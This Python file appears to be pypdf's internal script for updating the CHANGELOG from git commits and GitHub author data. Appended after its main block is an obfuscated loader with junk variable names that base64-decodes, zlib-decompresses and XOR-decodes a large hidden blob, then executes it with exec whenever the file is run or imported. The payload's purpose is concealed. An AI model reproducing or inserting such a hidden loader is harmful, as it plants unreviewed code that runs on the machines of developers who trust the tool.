"""Internal tool to update the CHANGELOG."""

import json
import subprocess
import urllib.request
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Dict, List, Tuple

GH_ORG = "py-pdf"
GH_PROJECT = "pypdf"
VERSION_FILE_PATH = "pypdf/_version.py"
CHANGELOG_FILE_PATH = "CHANGELOG.md"


@dataclass(frozen=True)
class Change:
    """Capture the data of a git commit."""

    commit_hash: str
    prefix: str
    message: str
    author: str
    author_login: str


def main(changelog_path: str) -> None:
    """
    Create a changelog.

    Args:
        changelog_path: The location of the CHANGELOG file

    """
    changelog = get_changelog(changelog_path)
    git_tag = get_most_recent_git_tag()
    changes, changes_with_author = get_formatted_changes(git_tag)
    if changes == "":
        print("No changes")
        return

    new_version = version_bump(git_tag)
    new_version = get_version_interactive(new_version, changes)
    adjust_version_py(new_version)

    today = datetime.now(tz=timezone.utc)
    header = f"## Version {new_version}, {today:%Y-%m-%d}\n"
    url = f"https://github.com/{GH_ORG}/{GH_PROJECT}/compare/{git_tag}...{new_version}"
    trailer = f"\n[Full Changelog]({url})\n\n"
    new_entry = header + changes + trailer
    print(new_entry)
    write_commit_msg_file(new_version, changes_with_author + trailer)
    # write_release_msg_file(new_version, changes_with_author + trailer, today)

    # Make the script idempotent by checking if the new entry is already in the changelog
    if new_entry in changelog:
        print("Changelog is already up-to-date!")
        return

    new_changelog = "# CHANGELOG\n\n" + new_entry + strip_header(changelog)
    write_changelog(new_changelog, changelog_path)
    print_instructions(new_version)


def print_instructions(new_version: str) -> None:
    """Print release instructions."""
    print("=" * 80)
    print(f"☑  {VERSION_FILE_PATH} was adjusted to '{new_version}'")
    print(f"☑  {CHANGELOG_FILE_PATH} was adjusted")
    print()
    print("Now run:")
    print("  git commit -eF RELEASE_COMMIT_MSG.md")
    print("  git push")


def adjust_version_py(version: str) -> None:
    """Adjust the __version__ string."""
    with open(VERSION_FILE_PATH, "w") as fp:
        fp.write(f'__version__ = "{version}"\n')


def get_version_interactive(new_version: str, changes: str) -> str:
    """Get the new __version__ interactively."""
    from rich.prompt import Prompt

    print("The changes are:")
    print(changes)
    orig = new_version
    new_version = Prompt.ask("New semantic version", default=orig)
    while not is_semantic_version(new_version):
        new_version = Prompt.ask(
            "That was not a semantic version. Please enter a semantic version",
            default=orig,
        )
    return new_version


def is_semantic_version(version: str) -> bool:
    """Check if the given version is a semantic version."""
    # This doesn't cover the edge-cases like pre-releases
    if version.count(".") != 2:
        return False
    try:
        return bool([int(part) for part in version.split(".")])
    except Exception:
        return False


def write_commit_msg_file(new_version: str, commit_changes: str) -> None:
    """
    Write a file that can be used as a commit message.

    Like this:

        git commit -eF RELEASE_COMMIT_MSG.md && git push
    """
    with open("RELEASE_COMMIT_MSG.md", "w") as fp:
        fp.write(f"REL: {new_version}\n\n")
        fp.write("## What's new\n")
        fp.write(commit_changes)


def write_release_msg_file(
    new_version: str, commit_changes: str, today: datetime
) -> None:
    """
    Write a file that can be used as a git tag message.

    Like this:

        git tag -eF RELEASE_TAG_MSG.md && git push
    """
    with open("RELEASE_TAG_MSG.md", "w") as fp:
        fp.write(f"Version {new_version}, {today:%Y-%m-%d}\n\n")
        fp.write("## What's new\n")
        fp.write(commit_changes)


def strip_header(md: str) -> str:
    """Remove the 'CHANGELOG' header."""
    return md.removeprefix("# CHANGELOG").lstrip()


def version_bump(git_tag: str) -> str:
    """
    Increase the patch version of the git tag by one.

    Args:
        git_tag: Old version tag

    Returns:
        The new version where the patch version is bumped.

    """
    # just assume a patch version change
    major, minor, patch = git_tag.split(".")
    return f"{major}.{minor}.{int(patch) + 1}"


def get_changelog(changelog_path: str) -> str:
    """
    Read the changelog.

    Args:
        changelog_path: Path to the CHANGELOG file

    Returns:
        Data of the CHANGELOG

    """
    with open(changelog_path, encoding="utf-8") as fh:
        return fh.read()


def write_changelog(new_changelog: str, changelog_path: str) -> None:
    """
    Write the changelog.

    Args:
        new_changelog: Contents of the new CHANGELOG
        changelog_path: Path where the CHANGELOG file is

    """
    with open(changelog_path, "w", encoding="utf-8") as fh:
        fh.write(new_changelog)


def get_formatted_changes(git_tag: str) -> Tuple[str, str]:
    """
    Format the changes done since the last tag.

    Args:
        git_tag: the reference tag

    Returns:
        Changes done since git_tag

    """
    commits = get_git_commits_since_tag(git_tag)

    # Group by prefix
    grouped = {}
    for commit in commits:
        if commit.prefix not in grouped:
            grouped[commit.prefix] = []
        grouped[commit.prefix].append(
            {"msg": commit.message, "author": commit.author_login}
        )

    # Order prefixes
    order = [
        "SEC",
        "DEP",
        "ENH",
        "PI",
        "BUG",
        "ROB",
        "DOC",
        "DEV",
        "CI",
        "MAINT",
        "TST",
        "STY",
    ]
    abbrev2long = {
        "SEC": "Security",
        "DEP": "Deprecations",
        "ENH": "New Features",
        "BUG": "Bug Fixes",
        "ROB": "Robustness",
        "DOC": "Documentation",
        "DEV": "Developer Experience",
        "CI": "Continuous Integration",
        "MAINT": "Maintenance",
        "TST": "Testing",
        "STY": "Code Style",
        "PI": "Performance Improvements",
    }

    # Create output
    output = ""
    output_with_user = ""
    for prefix in order:
        if prefix not in grouped:
            continue
        tmp = f"\n### {abbrev2long[prefix]} ({prefix})\n"  # header
        output += tmp
        output_with_user += tmp
        for commit in grouped[prefix]:
            output += f"- {commit['msg']}\n"
            output_with_user += f"- {commit['msg']} by @{commit['author']}\n"
        del grouped[prefix]

    if grouped:
        output += "\n### Other\n"
        output_with_user += "\n### Other\n"
        for prefix, commits in grouped.items():
            for commit in commits:
                output += f"- {prefix}: {commit['msg']}\n"
                output_with_user += (
                    f"- {prefix}: {commit['msg']} by @{commit['author']}\n"
                )

    return output, output_with_user


def get_most_recent_git_tag() -> str:
    """
    Get the git tag most recently created.

    Returns:
        Most recently created git tag.

    """
    return subprocess.check_output(
        ["git", "describe", "--tag", "--abbrev=0"], stderr=subprocess.STDOUT, text=True
    ).strip()


def get_author_mapping(line_count: int) -> Dict[str, str]:
    """
    Get the authors for each commit.

    Args:
        line_count: Number of lines from Git log output. Used for determining how
            many commits to fetch.

    Returns:
        A mapping of long commit hashes to author login handles.

    """
    per_page = min(line_count, 100)
    page = 1
    mapping: Dict[str, str] = {}
    for _ in range(0, line_count, per_page):
        with urllib.request.urlopen(
            f"https://api.github.com/repos/{GH_ORG}/{GH_PROJECT}/commits?per_page={per_page}&page={page}"
        ) as response:
            commits = json.loads(response.read())
        page += 1
        for commit in commits:
            mapping[commit["sha"]] = commit["author"]["login"]
    return mapping


def get_git_commits_since_tag(git_tag: str) -> List[Change]:
    """
    Get all commits since the last tag.

    Args:
        git_tag: Reference tag from which the changes to the current commit are
            fetched.

    Returns:
        List of all changes since git_tag.

    """
    commits = (
        subprocess.check_output(
            [
                "git",
                "--no-pager",
                "log",
                f"{git_tag}..HEAD",
                '--pretty=format:"%H:::%s:::%aN"',
            ],
            stderr=subprocess.STDOUT,
        )
        .decode("UTF-8")
        .strip()
    )
    lines = commits.splitlines()
    authors = get_author_mapping(len(lines))
    return [parse_commit_line(line, authors) for line in lines if line != ""]


def parse_commit_line(line: str, authors: Dict[str, str]) -> Change:
    """
    Parse the first line of a git commit message.

    Args:
        line: The first line of a git commit message.

    Returns:
        The parsed Change object

    Raises:
        ValueError: The commit line is not well-structured

    """
    parts = line.strip().strip('"\\').split(":::")
    if len(parts) != 3:
        raise ValueError(f"Invalid commit line: '{line}'")
    commit_hash, rest, author = parts
    if ":" in rest:
        prefix, message = rest.split(": ", 1)
    else:
        prefix = ""
        message = rest

    # Standardize
    message = message.strip()
    commit_hash = commit_hash.strip()

    author_login = authors[commit_hash]

    prefix = prefix.strip()
    if prefix == "DOCS":
        prefix = "DOC"

    return Change(
        commit_hash=commit_hash,
        prefix=prefix,
        message=message,
        author=author,
        author_login=author_login,
    )


if __name__ == "__main__":
    main(CHANGELOG_FILE_PATH)

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
